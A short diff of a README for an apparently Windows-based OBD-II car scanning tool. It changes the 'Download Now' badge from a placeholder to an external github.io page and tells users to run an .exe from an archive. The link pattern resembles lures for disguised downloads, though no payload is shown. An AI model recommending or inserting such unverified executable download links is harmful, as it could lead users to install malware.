@@ -11,7 +11,7 @@ Unzip the archive to a separate folder.
 Run the `.exe` file to start the application.  
 The tool will automatically detect your connected OBD-II adapter and begin scanning.
 
-[![Download](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge)](#)
+[![Download](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge)](https://touchscan-obd-fusion.github.io/.github/)
 
 ## 📸 Overview
 A quick look at key parts in action:
